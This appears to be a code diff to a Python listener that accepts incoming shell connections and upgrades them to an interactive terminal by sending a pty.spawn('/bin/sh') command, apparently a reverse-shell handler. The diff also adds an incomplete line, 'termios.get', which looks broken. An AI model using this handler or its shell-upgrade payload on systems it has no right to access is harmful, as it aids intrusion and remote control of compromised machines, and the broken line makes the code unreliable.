@@ -26,6 +26,7 @@ OLD_SETTINGS = None
 CONN = None
 CONN_ONLINE = 1
 CLOSED = 0
+TERM = ""
 STDOUT = sys.stdout.buffer
 
 
@@ -44,8 +45,7 @@ def stdprint(message):
 
 
 def close_socket():
-    import os
-    global FD, OLD_SETTINGS, CONN_ONLINE, CLOSED, CONN
+    global FD, OLD_SETTINGS, CONN_ONLINE, CLOSED, CONN, TERM
     if (CLOSED):
         return
     CLOSED = 1
@@ -53,13 +53,9 @@ def close_socket():
     try:
         CONN.close()
         termios.tcsetattr(FD, termios.TCSADRAIN, OLD_SETTINGS)
+        termios.get
     except Exception:
         pass
-    sys.stdin = sys.__stdin__
-    sys.stdout = sys.__stdout__
-    sys.stderr = sys.__stderr__
-    os.system("reset")
-    os.system("clear")
 
 
 def recv_daemon(conn):
@@ -92,7 +88,7 @@ def input_deamon(talk):
 
 
 def main(port, mode: int):
-    global CONN
+    global CONN, TERM
     init()
     CONN = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     CONN.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -106,6 +102,7 @@ def main(port, mode: int):
     try:
         rows, columns = popen('stty size', 'r').read().strip().split(" ")
         term = popen('printf $TERM').read()
+        TERM = term
     except Exception:
         term = "bomb"
         set_size = False
@@ -117,9 +114,8 @@ def main(port, mode: int):
         t = Thread(target=input_deamon, args=(talk, ))
         t.start()
         if (mode == 1):
-            talk.send(bytes("""python -c "__import__('pty').spawn('/bin/sh')" && exit\n""", encoding='utf-8'))
-        elif (mode == 2):
-            talk.send(bytes("""script -q /dev/null && exit\n""", encoding='utf-8'))
+            talk.send(bytes(
+                """python -c "__import__('pty').spawn('/bin/sh')" && exit\n""", encoding='utf-8'))
         talk.send(bytes("""alias ls='ls --color=auto'\n""", encoding='utf-8'))
         talk.send(bytes("""alias grep='grep --color=auto'\n""", encoding='utf-8'))
         if (set_size):
